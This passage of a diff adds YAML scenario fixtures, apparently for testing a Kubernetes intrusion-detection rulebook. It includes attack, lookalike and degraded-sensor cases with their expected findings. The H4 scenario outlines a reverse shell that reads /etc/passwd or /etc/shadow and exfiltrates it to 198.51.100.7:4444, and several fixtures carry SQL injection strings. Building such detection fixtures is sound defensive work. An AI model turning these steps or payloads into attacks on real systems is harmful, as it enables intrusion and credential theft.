+            reason: "123 requests in a few seconds exceed the principal's request-rate baseline (fires in every SCORE run with audit, 2026-10-21)"
+    links: []
+    variants:
+      - id: v1
+        rulebook_shaped: true
+      - id: v2
+        rulebook_shaped: false
+
+  # ========== H4: Suspected Exfiltration ==========
+
+  - id: h4_external_sensitive_exfil
+    kind: attack
+    title: "H4 external: Sensitive file read + external connection"
+    source:
+      class: external
+      citation:
+        source: CVE-2020-9484
+        reference: "Apache Tomcat deserialization RCE"
+        url: "https://nvd.nist.gov/vuln/detail/CVE-2020-9484"
+    author: "claude (automated draft, task p1-05)"
+    adaptation_note: |
+      CVE-2020-9484: Tomcat RCE → reverse shell → reads /etc/passwd → exfiltrates.
+      Adapted to containerized Java app scenario.
+    roles:
+      - name: compromised_app
+        kind: internal_pod
+      - name: attacker
+        kind: external_client
+    steps:
+      - step: 1
+        action: shell_exec
+        params:
+          parent_process: compromised_app
+          shell_binary: /bin/sh
+          command: "sh -i"
+        outcome: success
+      - step: 2
+        action: process_exec
+        params:
+          parent_process: "@step1.process"
+          executable: /bin/cat
+          argv: [cat, /etc/passwd]
+        outcome: success
+      - step: 3
+        action: read_sensitive_file
+        params:
+          reader_process: "@step2.process"
+          file_path: /etc/passwd
+          data_class: system
+        outcome: success
+        expects: []          # the read is part of the later H4 opportunity
+      - step: 4
+        action: connect_external
+        params:
+          source_pod: compromised_app
+          source_process: "@step1.process"
+          remote_ip: 198.51.100.7
+          remote_port: 4444
+          protocol: tcp
+        outcome: success
+        expects:
+          - finding: H2
+            state: PRESENT
+            reason: "First connection from the workload to this external destination"
+      - step: 5
+        action: egress_transfer
+        params:
+          source_pod: compromised_app
+          destination: 198.51.100.7
+          bytes_out: 2048
+          protocol: tcp
+        outcome: success
+        expects:
+          - finding: H4
+            state: PRESENT
+            reason: "File read + external connect + bytes_out in same lineage"
+      - step: 6
+        action: read_sensitive_file
+        benign: true
+        float: decoy
+        params:
+          reader_process: compromised_app
+          file_path: /app/config/application.yaml
+          data_class: application
+        outcome: success
+        expects: []
+    links:
+      - from: 1
+        to: 3
+        witness: PROCESS_ANCESTRY
+        expected: PRESENT
+        reason: "cat, which reads the file, is a child of the reverse shell"
+      - from: 1
+        to: 4
+        witness: PROCESS_ANCESTRY
+        expected: PRESENT
+        reason: "same-process continuity: the reverse shell itself connects out"
+      - from: 4
+        to: 5
+        witness: NETWORK_FLOW
+        expected: PRESENT
+        reason: "same-socket continuity: bytes counted on the connect's flow"
+      - from: 1
+        to: 6
+        witness: PROCESS_ANCESTRY
+        expected: ABSENT
+        gap_of: [1, 3]
+        reason: "twin: the Pod's own app process (the shell's parent, not its descendant) reads its config"
+        shared_keys: [pod_uid, lineage_id]
+    variants:
+      - id: v1
+        rulebook_shaped: true
+      - id: v2
+        rulebook_shaped: false
+        changes:
+          - field: step.2.params.executable
+            value: /usr/bin/base64
+          - field: step.2.params.argv
+            value: [base64, /etc/shadow]
+          - field: step.3.params.file_path
+            value: /etc/shadow
+          - field: step.4.params.remote_ip
+            value: 198.51.100.8
+          - field: step.4.params.remote_port
+            value: 8080
+          - field: step.5.params.destination
+            value: 198.51.100.8
+          - field: step.6.params.file_path
+            value: /app/config/logging.yaml
+
+  # ========== Administrative and Benign Scenarios ==========
+
+  - id: admin_rbac_mutation
+    kind: admin
+    title: "Admin: Legitimate RBAC mutation"
+    source:
+      class: benign
+      citation:
+        source: K8NTEXT
+        reference: "section 8: RBAC mutations"
+    author: "claude (automated draft, task p1-05)"
+    adaptation_note: "Cluster admin creating RBAC bindings"
+    fixture_only: true
+    roles:
+      - name: cluster_admin
+        kind: operator
+    steps:
+      - step: 1
+        action: api_request
+        params:
+          principal: cluster_admin
+          verb: create
+          api_group: "rbac.authorization.k8s.io"
+          resource: rolebindings
+          namespace: "production"
+          body: "{\"roleRef\": {\"kind\": \"Role\"}, \"subjects\": [{\"kind\": \"ServiceAccount\"}]}"
+        outcome: success
+    links: []
+    variants:
+      - id: v1
+        rulebook_shaped: true
+
+  - id: benign_service_traffic
+    kind: benign_workload
+    title: "Benign: Service-to-service communication"
+    source:
+      class: benign
+      citation:
+        source: "baseline traffic"
+        reference: "normal service mesh operations"
+    author: "claude (automated draft, task p1-05)"
+    adaptation_note: "Frontend → backend → database within baseline"
+    roles:
+      - name: frontend_pod
+        kind: internal_pod
+      - name: backend_pod
+        kind: internal_pod
+      - name: database_pod
+        kind: internal_pod
+    steps:
+      - step: 1
+        action: connect_internal
+        params:
+          source_pod: frontend_pod
+          target_service_or_pod: backend_pod
+          target_port: 8080
+          protocol: tcp
+        outcome: success
+        expects:
+          - finding: G1a
+            state: ABSENT
+      - step: 2
+        action: connect_internal
+        params:
+          source_pod: backend_pod
+          target_service_or_pod: database_pod
+          target_port: 5432
+          protocol: tcp
+        outcome: success
+        expects:
+          - finding: G1a
+            state: ABSENT
+    links: []
+    variants:
+      - id: v1
+        rulebook_shaped: true
+
+  # ========== Degraded/Nonlink Scenarios ==========
+
+  # ========== A1: Lookalikes and Degraded ==========
+
+  - id: a1_benign_json_injection_token
+    kind: lookalike
+    title: "A1 lookalike: Benign JSON request with injection tokens"
+    source:
+      class: external
+      citation:
+        source: "rulebook negative control"
+        reference: "pattern tokens in JSON string fields"
+    author: "claude (automated draft, task p1-06)"
+    adaptation_note: |
+      Request contains injection pattern tokens but inside a JSON string field that the pattern set excludes.
+      Example: user searching for documentation about SQL injection techniques.
+    roles:
+      - name: benign_client
+        kind: internal_pod
+      - name: api_server
+        kind: internal_pod
+    steps:
+      - step: 1
+        action: http_request
+        params:
+          source_pod: benign_client
+          target_service: api_server
+          method: POST
+          path: "/api/search"
+          query_params: ""
+          body_prefix_b64: "eyJxdWVyeSI6ICJTUUwgaW5qZWN0aW9uIHVzZXMgdGhlIHBhdHRlcm4gJzsgRFJPUCBUQUJMRSB1c2Vycy7igJM/In0="
+        outcome: success
+        expects:
+          - finding: A1
+            state: ABSENT
+            reason: "Pattern tokens present but inside JSON field excluded by negative control"
+          - finding: A2
+            state: ABSENT
+            reason: "Pattern tokens inside a JSON field excluded by the negative control"
+    links: []
+    variants:
+      - id: v1
+        rulebook_shaped: false
+
+  - id: a1_blocked_by_waf
+    kind: degraded
+    title: "A1 attempted but blocked: WAF denies injection request"
+    source:
+      class: external
+      citation:
+        source: "common defense pattern"
+        reference: "web application firewall blocking"
+    author: "claude (automated draft, task p1-05)"
+    adaptation_note: "A1 pattern detected but request denied before reaching handler"
+    roles:
+      - name: attacker
+        kind: external_client
+      - name: backend
+        kind: internal_pod
+    steps:
+      - step: 1
+        action: http_request
+        params:
+          source_pod: attacker
+          target_service: backend
+          method: GET
+          path: "/search"
+          query_params: "q='; DROP TABLE users;--"
+          response_status: 403
+        outcome: success
+        expects:
+          - finding: A1
+            state: PRESENT
+            reason: "SQLi pattern detected"
+          - finding: A2
+            state: ABSENT
+            reason: "HTTP 403 Forbidden (WAF block); no success response"
+    links: []
+    variants:
+      - id: v1
+        rulebook_shaped: false
+
+  - id: a1_missing_gateway_observer
+    kind: degraded
+    title: "A1 unobservable: injection attempt but gateway observer down"
+    source:
+      class: external
+      citation:
+        source: "coverage gap"
+        reference: "sensor unavailability"
+    author: "claude (automated draft, task p1-06)"
+    adaptation_note: "Attack occurs but gateway observer was not running; pattern never observed"
+    observability: "SOURCE_IDLE on gateway during attack window"
+    roles:
+      - name: attacker
+        kind: external_client
+      - name: backend
+        kind: internal_pod
+    steps:
+      - step: 1
+        action: http_request
+        unobserved: [gateway]
+        params:
+          source_pod: attacker
+          target_service: backend
+          method: GET
+          path: "/api/users"
+          query_params: "id=1 OR 1=1"
+        outcome: success
+        expects:
+          - finding: A1
+            state: UNOBSERVABLE
+            reason: "Gateway observer SOURCE_IDLE during attack; pattern never observed"
+    links: []
+    variants:
+      - id: v1
+        rulebook_shaped: false
+
+  # ========== A2: Lookalikes and Degraded ==========
+
+  - id: a2_benign_success_response
+    kind: lookalike
+    title: "A2 lookalike: Generic success response not from injection handler"
+    source:
+      class: external
+      citation:
+        source: "rulebook negative control"
+        reference: "generic success response not from injection"
+    author: "claude (automated draft, task p1-06)"
+    adaptation_note: "Request succeeds but response is benign (not from injection handling)"
+    roles:
+      - name: benign_client
+        kind: internal_pod
+      - name: api_server
+        kind: internal_pod
+    steps:
+      - step: 1
+        action: http_request
+        params:
+          source_pod: benign_client
+          target_service: api_server
+          method: GET
+          path: "/api/status"
+          query_params: ""
+        outcome: success
+        expects:
+          - finding: A2
+            state: ABSENT
+            reason: "HTTP 200 response but not from injection pattern handling"
+    links: []
+    variants:
+      - id: v1
+        rulebook_shaped: false
+
+  - id: a2_response_not_observed
+    kind: degraded
+    degraded_by: field
+    title: "A2 unobservable: injection pattern present but response lost"
+    source:
+      class: external
+      citation:
+        source: "coverage gap"
+        reference: "response observer loss"
+    author: "claude (automated draft, task p1-06)"
+    adaptation_note: "Injection pattern detected but response was not captured (observer_loss)"
+    observability: "observer_loss set for response window"
+    roles:
+      - name: attacker
+        kind: external_client
+      - name: backend
+        kind: internal_pod
+    steps:
+      - step: 1
+        action: http_request
+        params:
+          source_pod: attacker
+          target_service: backend
+          method: POST
+          path: "/api/search"
+          query_params: "query=UNION SELECT password FROM users"
+          observer_loss: true
+        outcome: success
+        expects:
+          - finding: A1
+            state: PRESENT
+            reason: "SQLi pattern detected in request"
+          - finding: A2
+            state: UNOBSERVABLE
+            reason: "Response not observed (observer_loss); no indicator match possible"
+    links: []
+    variants:
+      - id: v1
+        rulebook_shaped: false
+
+  # ========== B1: Lookalikes (already have from K8NTEXT) and Degraded ==========
+
+  - id: b1_offline_audit
+    kind: degraded
+    title: "B1 unobservable: enumeration occurs but audit not running"
+    source:
+      class: external
+      citation:
+        source: "coverage gap"
+        reference: "audit provider gap"
+    author: "claude (automated draft, task p1-06)"
+    adaptation_note: "Principal enumerates resources but audit feed has gap; no events recorded"
+    observability: "AUD-PROVIDER-READS gap covering enumeration window"
+    roles:
+      - name: attacker_sa
+        kind: service_account
+    steps:
+      - step: 1
+        action: api_request
+        unobserved: [audit]
+        params:
+          principal: attacker_sa
+          verb: list
+          api_group: ""
+          resource: pods
+          namespace: "default"
+        outcome: success
+        expects:
+          - finding: B1
+            state: UNOBSERVABLE
+            reason: "Audit feed has gap (AUD-PROVIDER-READS); no enumeration events recorded"
+    links: []
+    variants:
+      - id: v1
+        rulebook_shaped: false
+
+  # ========== B2: Lookalikes and Degraded ==========
+
+  - id: b2_legitimate_403_burst
+    kind: lookalike
+    title: "B2 lookalike: Burst of 403 authorization denials (not auth failure)"
+    source:
+      class: external
+      citation:
+        source: "rulebook negative control"
+        reference: "authorization denials vs auth failures"
+    author: "claude (automated draft, task p1-06)"
+    adaptation_note: "High volume of 403 responses but all are authorization (not authentication) failures"
+    roles:
+      - name: client_sa
+        kind: service_account
+    steps:
+      - step: 1
+        action: api_request
+        params:
+          principal: client_sa
+          verb: get
+          api_group: ""
+          resource: secrets
+          namespace: "default"
+        outcome: success
+        expects:
+          - finding: B2
+            state: ABSENT
+            reason: "Authorization denied (403); not authentication failure (401)"
+          - finding: B1
+            state: ABSENT
+            reason: "Benign reads by a baselined principal; not resource enumeration"
+    links: []
+    variants:
+      - id: v1
+        rulebook_shaped: false
+
+  - id: b2_auth_failure_below_threshold
+    kind: degraded
+    degraded_by: volume
+    title: "B2 unobservable: auth failures below detection threshold"
+    source:
+      class: external
+      citation:
+        source: "threshold"
+        reference: "parameter N_B2"
+    author: "claude (automated draft, task p1-06)"
+    adaptation_note: "Some 401 failures occur but not enough to exceed N_B2 threshold"
+    roles:
+      - name: attacker
+        kind: external_client
+    steps:
+      - step: 1
+        action: api_auth_failure
+        params:
+          source_ip: "192.168.1.100"
+          verb: get
+          api_group: ""
+          resource: pods
+          reason: unauthenticated
+        outcome: success
+        expects:
+          - finding: B2
+            state: ABSENT
+            reason: "Only few auth failures from source; below N_B2 threshold"
+    links: []
+    variants:
+      - id: v1
+        rulebook_shaped: false
+
+  - id: b2_brute_force_audit_gap
+    kind: degraded
+    title: "B2 unobservable: brute-force burst lost in an audit feed gap"
+    source:
+      class: external
+      citation:
+        source: "coverage gap"
+        reference: "audit feed gap during the failures"
+    author: "claude (review fix A6, 2026-10-28)"
+    adaptation_note: "b2_kube_ids0_brute_force with the burst's audit records lost: the failures that would exceed N_B2 are not observed. Not in PILOT (the run matrices name their scenarios)."
+    roles:
+      - name: attacker_ip
+        kind: external_client
+    steps:
+      - step: 1
+        action: api_auth_failure
+        repeat: 25
+        unobserved:
+          - audit
+        params:
+          source_ip: "172.16.0.50"
+          verb: get
+          api_group: ""
+          resource: pods
+          reason: unauthenticated
+        outcome: success
+        expects:
+          - finding: B2
+            state: UNOBSERVABLE
+            reason: "The failures are lost in an audit feed gap"
+    links: []
+    variants:
+      - id: v1
+        rulebook_shaped: false
+
+  # ========== B3: Lookalikes and Degraded ==========
+
+  - id: b3_scheduled_batch_job
+    kind: lookalike
+    title: "B3 lookalike: Scheduled batch job within principal baseline"
+    source:
+      class: external
+      citation:
+        source: "rulebook negative control"
+        reference: "scheduled benign batch job within baseline"
+    author: "claude (automated draft, task p1-06)"
+    adaptation_note: "High request rate but from scheduled job, within established baseline"
+    roles:
+      - name: batch_job_sa
+        kind: service_account
+    steps:
+      - step: 1
+        action: api_request
+        params:
+          principal: batch_job_sa
+          verb: list
+          api_group: ""
+          resource: configmaps
+          namespace: "default"
+        outcome: success
+        expects:
+          - finding: B3
+            state: ABSENT
+            reason: "High request rate but within baseline for scheduled batch job"
+          - finding: B1
+            state: ABSENT
+            reason: "Batch job at a high rate on its own resources; not resource enumeration"
+    links: []
+    variants:
+      - id: v1
+        rulebook_shaped: false
+
+  - id: b3_rate_spike_unobserved
+    kind: degraded
+    title: "B3 unobservable: rate spike but audit gap during attack"
+    source:
+      class: external
+      citation:
+        source: "coverage gap"
+        reference: "audit timing gap"
+    author: "claude (automated draft, task p1-06)"
+    adaptation_note: "Request spike occurs but audit timestamps have gap; baseline unavailable"
+    observability: "AUD-POLICY-EFFECTIVE gap during spike window"
+    roles:
+      - name: attacker_sa
+        kind: service_account
+    steps:
+      - step: 1
+        action: api_request
+        unobserved: [audit]
+        params:
+          principal: attacker_sa
+          verb: list
+          api_group: ""
+          resource: configmaps
+          namespace: "default"
+        outcome: success
+        expects:
+          - finding: B3
+            state: UNOBSERVABLE
+            reason: "Audit gap during spike window; cannot compare to baseline"
+    links: []
+    variants:
+      - id: v1
+        rulebook_shaped: false
+
+  # ========== C1a/C1b: Lookalikes and Degraded ==========
+
+  - id: c1a_benign_namespace_escape
+    kind: lookalike
+    title: "C1a lookalike: Legitimate container introspection"
+    source:
+      class: external
+      citation:
+        source: "normal operations"
+        reference: "container debugging and introspection"
+    author: "claude (automated draft, task p1-06)"
+    adaptation_note: "Namespace operations observed but for legitimate container inspection"
+    roles:
+      - name: admin_process
+        kind: internal_pod
+    steps:
+      - step: 1
+        action: namespace_escape
+        params:
+          source_process: admin_process
+        outcome: attempt_failed
+        expects:
+          - finding: C1a
+            state: ABSENT
+            reason: "Escape attempt failed; no privilege gain observed"
+          - finding: C1b
+            state: ABSENT
+            reason: "Escape attempt failed; no transition into a host namespace"
+    links: []
+    variants:
+      - id: v1
+        rulebook_shaped: false
+
+  - id: c1a_no_capability_change
+    kind: degraded
+    title: "C1a unobservable: escape attempt but capability change not observed"
+    source:
+      class: external
+      citation:
+        source: "coverage gap"
+        reference: "missing eBPF capability change event"
+    author: "claude (automated draft, task p1-06)"
+    adaptation_note: "Process attempts escape but capability/privilege change not captured"
+    observability: "Missing eBPF RawEbpfRecord for capability change"
+    roles:
+      - name: container_process
+        kind: internal_pod
+    steps:
+      - step: 1
+        action: capability_gain
+        unobserved: [ebpf]
+        params:
+          source_process: container_process
+        outcome: success
+        expects:
+          - finding: F1
+            state: UNOBSERVABLE
+            reason: "Capability gain not recorded"
+          - finding: C1a
+            state: UNOBSERVABLE
+            reason: "Escape attempt made but capability change not recorded"
+    links: []
+    variants:
+      - id: v1
+        rulebook_shaped: false
+
+  - id: c1b_benign_namespace_ops
+    kind: lookalike
+    title: "C1b lookalike: Benign namespace operations"
+    source:
+      class: external
+      citation:
+        source: "normal operations"
+        reference: "container daemon operations"
+    author: "claude (automated draft, task p1-06)"
+    adaptation_note: "Namespace transitions observed but for normal workload management"
+    roles:
+      - name: system_process
+        kind: internal_pod
+    steps:
+      - step: 1
+        action: namespace_escape
+        params:
+          source_process: system_process
+        outcome: attempt_failed
+        expects:
+          - finding: C1b
+            state: ABSENT
+            reason: "Namespace operations but attempt failed; no escape achieved"
+          - finding: C1a
+            state: ABSENT
+            reason: "Namespace operations for normal workload management; attempt failed"
+    links: []
+    variants:
+      - id: v1
+        rulebook_shaped: false
+
+  - id: c1b_escape_unobserved
+    kind: degraded
+    degraded_by: field
+    title: "C1b unobservable: escape indicators missing from stream"
+    source:
+      class: external
+      citation:
+        source: "coverage gap"
+        reference: "observation completeness"
+    author: "claude (automated draft, task p1-06)"
+    adaptation_note: "Container escape occurs but indicators not captured by available sources"
+    observability: "Coverage gap in required escape observation fields"
+    roles:
+      - name: attacker_container
+        kind: internal_pod
+    steps:
+      - step: 1
+        action: namespace_escape
+        params:
+          source_process: attacker_container
+        outcome: success
+        expects:
+          - finding: C1b
+            state: UNOBSERVABLE
+            reason: "Escape indicators not captured; coverage gap in observation"
+          - finding: C1a
+            state: PRESENT
+            reason: "Escape attempt indicators are rendered; the observed escape (C1b) is not"
+    links: []
+    variants:
+      - id: v1
+        rulebook_shaped: false
+
+  # ========== D1: Lookalikes and Degraded ==========
+
+  - id: d1_benign_token_read
+    kind: lookalike
+    title: "D1 lookalike: Legitimate token file access by system process"
+    source:
+      class: external
+      citation:
+        source: "normal operations"
+        reference: "kubelet and system components reading tokens"
+    author: "claude (automated draft, task p1-06)"
+    adaptation_note: "Token file accessed but by system process in normal operation"
+    roles:
+      - name: system_process
+        kind: internal_pod
+    steps:
+      - step: 1
+        action: read_token_file
+        params:
+          reader_process: system_process
+          token_file_path: "/var/run/secrets/kubernetes.io/serviceaccount/token"
+        outcome: success
+        expects:
+          - finding: D1
+            state: ABSENT
+            reason: "Token accessed by legitimate system process for normal operations"
+    links: []
+    variants:
+      - id: v1
+        rulebook_shaped: false
+
+  - id: d1_token_read_no_use
+    kind: degraded
+    degraded_by: field
+    title: "D1 unobservable: token read but no subsequent use observed"
+    source:
+      class: external
+      citation:
+        source: "coverage gap"
+        reference: "missing context linking"
+    author: "claude (automated draft, task p1-06)"
+    adaptation_note: "Token read occurs but subsequent API use not captured"
+    observability: "Coverage gap between token read and API use"
+    roles:
+      - name: attacker
+        kind: internal_pod
+    steps:
+      - step: 1
+        action: read_token_file
+        params:
+          reader_process: attacker
+          token_file_path: "/var/run/secrets/kubernetes.io/serviceaccount/token"
+        outcome: success
+        expects:
+          - finding: D1
+            state: UNOBSERVABLE
+            reason: "Token read observed but subsequent use missing from stream"
+    links: []
+    variants:
+      - id: v1
+        rulebook_shaped: false
+
+  # ========== E1: Lookalikes and Degraded ==========
+
+  - id: e1_signed_image_admission
+    kind: lookalike
+    title: "E1 lookalike: Signed container image admitted through policy"
+    source:
+      class: external
+      citation:
+        source: "normal operations"
+        reference: "image policy enforcement"
+    author: "claude (automated draft, task p1-06)"
+    adaptation_note: "Image admitted but it is properly signed and verified"
+    roles:
+      - name: controller
+        kind: internal_pod
+    steps:
+      - step: 1
+        action: admit_pod
+        params:
+          image: "gcr.io/my-org/app:v1.2.3@sha256:abcd"
+        outcome: success
+        expects:
+          - finding: E1
+            state: ABSENT
+            reason: "Image admission policy allows signed images"
+    links: []
+    variants:
+      - id: v1
+        rulebook_shaped: false
+
+  - id: e1_policy_not_enforced
+    kind: degraded
+    title: "E1 unobservable: unsigned image admitted but policy admission events missing"
+    source:
+      class: external
+      citation:
+        source: "coverage gap"
+        reference: "missing admission controller events"
+    author: "claude (automated draft, task p1-06)"
+    adaptation_note: "Unsigned image admitted but admission controller events not captured"
+    observability: "Missing admission.k8s.io events"
+    roles:
+      - name: controller
+        kind: internal_pod
+    steps:
+      - step: 1
+        action: admit_pod
+        unobserved: [kyverno]
+        params:
+          image: "untrusted.com/malware:latest"
+        outcome: success
+        expects:
+          - finding: E1
+            state: UNOBSERVABLE
+            reason: "Unsigned image admitted but admission controller events not observed"
+    links: []
+    variants:
+      - id: v1
+        rulebook_shaped: false
+
+  # ========== E2: Lookalikes and Degraded ==========
+
+  - id: e2_benign_file_write
+    kind: lookalike
+    title: "E2 lookalike: Benign executable file write (normal deployment)"
+    source:
+      class: external
+      citation:
+        source: "normal operations"
+        reference: "application runtime file operations"
+    author: "claude (automated draft, task p1-06)"
+    adaptation_note: "Executable file written but as part of normal application deployment"
+    roles:
+      - name: app_process
+        kind: internal_pod
+    steps:
+      - step: 1
+        action: file_write
+        params:
+          source_process: app_process
+          file_path: "/app/lib/plugin.so"
+        outcome: success
+        expects:
+          - finding: E2
+            state: ABSENT
+            reason: "File write but in normal application directory"
+    links: []
+    variants:
+      - id: v1
+        rulebook_shaped: false
+
+  - id: e2_write_no_execute_observed
+    kind: degraded
+    title: "E2 unobservable: suspicious file written but chmod not recorded"
+    source:
+      class: external
+      citation:
+        source: "coverage gap"
+        reference: "missing syscall event"
+    author: "claude (automated draft, task p1-06)"
+    adaptation_note: "Suspicious file written but chmod/execute permission change not captured"
+    observability: "Missing chmod syscall event"
+    roles:
+      - name: attacker
+        kind: internal_pod
+    steps:
+      - step: 1
+        action: file_write
+        unobserved: [ebpf]
+        params:
+          source_process: attacker
+          file_path: "/tmp/implant.so"
+        outcome: success
+        expects:
+          - finding: E2
+            state: UNOBSERVABLE
+            reason: "File written but chmod/execute bit not observed"
+    links: []
+    variants:
+      - id: v1
+        rulebook_shaped: false
+
+  # ========== F1: Lookalikes and Degraded ==========
+
+  - id: f1_benign_privilege_drop
+    kind: lookalike
+    title: "F1 lookalike: Process privilege drop (normal operation)"
+    source:
+      class: external
+      citation:
+        source: "normal operations"
+        reference: "privilege dropping by services"
+    author: "claude (automated draft, task p1-06)"
+    adaptation_note: "UID change occurs but it's a drop to lower privilege (normal)"
+    roles:
+      - name: service_process
+        kind: internal_pod
+    steps:
+      - step: 1
+        action: privilege_change
+        params:
+          source_process: service_process
+        outcome: success
+        expects:
+          - finding: F1
+            state: ABSENT
+            reason: "UID change but privilege decrease, not escalation to root"
+    links: []
+    variants:
+      - id: v1
+        rulebook_shaped: false
+
+  - id: f1_privilege_change_not_recorded
+    kind: degraded
+    title: "F1 unobservable: privilege escalation but syscall not captured"
+    source:
+      class: external
+      citation:
+        source: "coverage gap"
+        reference: "missing eBPF syscall event"
+    author: "claude (automated draft, task p1-06)"
+    adaptation_note: "Privilege escalation occurs but eBPF sensor did not capture syscall"
+    observability: "eBPF syscall event not captured"
+    roles:
+      - name: attacker
+        kind: internal_pod
+    steps:
+      - step: 1
+        action: euid_to_root
+        unobserved: [ebpf]
+        params:
+          source_process: attacker
+        outcome: success
+        expects:
+          - finding: F1
+            state: UNOBSERVABLE
+            reason: "Privilege escalation but syscall change not recorded by eBPF"
+    links: []
+    variants:
+      - id: v1
+        rulebook_shaped: false
+
+  # ========== G1a: Lookalikes and Degraded ==========
+
+  - id: g1a_benign_network_scan
+    kind: lookalike
+    title: "G1a lookalike: Network diagnostics tool (legitimate scanning)"
+    source:
+      class: external
+      citation:
+        source: "normal operations"
+        reference: "network troubleshooting and diagnostics"
+    author: "claude (automated draft, task p1-06)"
+    adaptation_note: "Port connections observed but from legitimate diagnostic tool"
+    roles:
+      - name: diagnostic_pod
+        kind: internal_pod
+      - name: scanned_pod
+        kind: internal_pod
+    steps:
+      - step: 1
+        action: connect_internal
+        params:
+          source_pod: diagnostic_pod
+          target_service_or_pod: scanned_pod
+          target_port: 22
+        outcome: success
+        expects:
+          - finding: G1a
+            state: ABSENT
+            reason: "Network connection but from legitimate diagnostic Pod"
+    links: []
+    variants:
+      - id: v1
+        rulebook_shaped: false
+
+  - id: g1a_port_scan_unobserved
+    kind: degraded
+    title: "G1a unobservable: port scan occurs but network observer has gap"
+    source:
+      class: external
+      citation:
+        source: "coverage gap"
+        reference: "network source completeness"
+    author: "claude (automated draft, task p1-06)"
+    adaptation_note: "Attacker scans ports but network observer was not running"
+    observability: "NETWORK_FLOW source has gap during scan window"
+    roles:
+      - name: attacker
+        kind: internal_pod
+      - name: scanned_pod
+        kind: internal_pod
+    steps:
+      - step: 1
+        action: connect_internal
+        unobserved: [ebpf]
+        params:
+          source_pod: attacker
+          target_service_or_pod: scanned_pod
+          target_port: 80
+        outcome: success
+        expects:
+          - finding: G1a
+            state: UNOBSERVABLE
+            reason: "Port scan occurs but network observer unavailable (NETWORK_FLOW gap)"
+    links: []
+    variants:
+      - id: v1
+        rulebook_shaped: false
+
+  # ========== G2: Lookalikes (already have) and Degraded ==========
+
+  - id: g2_kubectl_exec_admin
+    kind: lookalike
+    title: "G2 lookalike: kubectl exec for legitimate debugging by operator"
+    source:
+      class: benign
+      citation:
+        source: K8NTEXT
+        reference: "section 8: K8NTEXT human-user actions (pods/exec)"
+    author: "claude (automated draft, task p1-06)"
+    adaptation_note: "kubectl exec recorded but by legitimate administrator for debugging"
+    roles:
+      - name: admin_user
+        kind: operator
+    steps:
+      - step: 1
+        action: shell_exec
+        params:
+          source_principal: admin_user
+        outcome: success
+        expects:
+          - finding: G2
+            state: ABSENT
+            reason: "shell exec by admin user, legitimate debugging activity"
+    links: []
+    variants:
+      - id: v1
+        rulebook_shaped: false
+
+  - id: g2_exec_session_ambiguous
+    kind: degraded
+    degraded_by: field
+    title: "G2 unobservable: exec session with ambiguous principal identity"
+    source:
+      class: external
+      citation:
+        source: "identity ambiguity"
+        reference: "Pod IP reuse at request time"
+    author: "claude (automated draft, task p1-06)"
+    adaptation_note: "exec recorded but principal identity ambiguous due to Pod IP reuse"
+    observability: "JOIN_UNCERTAIN for principal during exec window"
+    roles:
+      - name: unknown_principal
+        kind: internal_pod
+    steps:
+      - step: 1
+        action: shell_exec
+        params:
+          source_principal: unknown_principal
+        outcome: success
+        expects:
+          - finding: G2
+            state: UNOBSERVABLE
+            reason: "exec recorded but principal identity ambiguous (Pod IP reuse at request time)"
+    links: []
+    variants:
+      - id: v1
+        rulebook_shaped: false
+
+  # ========== H1: Lookalikes and Degraded ==========
+
+  - id: h1_benign_large_response
+    kind: lookalike
+    title: "H1 lookalike: Large data transfer for legitimate request"
+    source:
+      class: external
+      citation:
+        source: "normal operations"
+        reference: "large file downloads and bulk data transfers"
+    author: "claude (automated draft, task p1-06)"
+    adaptation_note: "Large outbound data but from legitimate bulk export/download operation"
+    roles:
+      - name: user_pod
+        kind: internal_pod
+      - name: api_server
+        kind: internal_pod
+    steps:
+      - step: 1
+        action: egress_transfer
+        params:
+          source_pod: user_pod
+          target_pod: api_server
+          bytes_out: 1000000000
+        outcome: success
+        expects:
+          - finding: H1
+            state: ABSENT
+            reason: "Large response but from legitimate bulk export endpoint"
+    links: []
+    variants:
+      - id: v1
+        rulebook_shaped: false
+
+  - id: h1_egress_volume_unclear
+    kind: degraded
+    degraded_by: field
+    title: "H1 unobservable: large external transfer but clock uncertainty masks timing"
+    source:
+      class: external
+      citation:
+        source: "timing uncertainty"
+        reference: "clock skew and uncertainty"
+    author: "claude (automated draft, task p1-06)"
+    adaptation_note: "Large external transfer occurs but timestamps uncertain; cannot confirm rate"
+    observability: "TIME_BASIS_UNKNOWN for egress window"
+    roles:
+      - name: attacker
+        kind: internal_pod
+    steps:
+      - step: 1
+        action: connect_external
+        params:
+          source_pod: attacker
+          remote_ip: "8.8.8.8"
+          remote_port: 443
+        outcome: success
+        expects:
+          - finding: H1
+            state: UNOBSERVABLE
+            reason: "Large external transfer but timestamps uncertain (TIME_BASIS_UNKNOWN)"
+          - finding: H2
+            state: PRESENT
+            reason: "8.8.8.8:443 is in no workload's destination baseline; the timing gap does not hide a new destination (fires in every SCORE run with eBPF, 2026-10-21)"
+    links: []
+    variants:
+      - id: v1
+        rulebook_shaped: false
+
+  # ========== H2: Lookalikes and Degraded ==========
+
+  - id: h2_benign_external_connect
+    kind: lookalike
+    title: "H2 lookalike: Legitimate external connection (API call)"
+    source:
+      class: external
+      citation:
+        source: "normal operations"
+        reference: "legitimate external service calls"
+    author: "claude (automated draft, task p1-06)"
+    adaptation_note: "External connection established but for legitimate API/service call"
+    roles:
+      - name: service_pod
+        kind: internal_pod
+    steps:
+      - step: 1
+        action: connect_external
+        params:
+          source_pod: service_pod
+          remote_ip: "1.2.3.4"
+          remote_port: 443
+        outcome: success
+        expects:
+          - finding: H2
+            state: ABSENT
+            reason: "External connection but for legitimate API call"
+    links: []
+    variants:
+      - id: v1
+        rulebook_shaped: false
+
+  - id: h2_external_connect_no_witness
+    kind: degraded
+    title: "H2 unobservable: external connection but connect syscall not captured"
+    source:
+      class: external
+      citation:
+        source: "coverage gap"
+        reference: "missing eBPF network syscall"
+    author: "claude (automated draft, task p1-06)"
+    adaptation_note: "Attacker connects externally but eBPF did not capture connect syscall"
+    observability: "Missing eBPF RawEbpfRecord for network connect"
+    roles:
+      - name: attacker
+        kind: internal_pod
+    steps:
+      - step: 1
+        action: connect_external
+        unobserved: [ebpf]
+        params:
+          source_pod: attacker
+          remote_ip: "198.51.100.66"
+          remote_port: 4444
+        outcome: success
+        expects:
+          - finding: H2
+            state: UNOBSERVABLE
+            reason: "External connection made but eBPF syscall event not captured"
+    links: []
+    variants:
+      - id: v1
+        rulebook_shaped: false
+
+  # ========== H3: Lookalikes (already have from K8NTEXT) and Degraded ==========
+
+  - id: h3_secret_access_baseline
+    kind: lookalike
+    title: "H3 lookalike: Operator secret access within baseline"
+    source:
+      class: benign
+      citation:
+        source: K8NTEXT
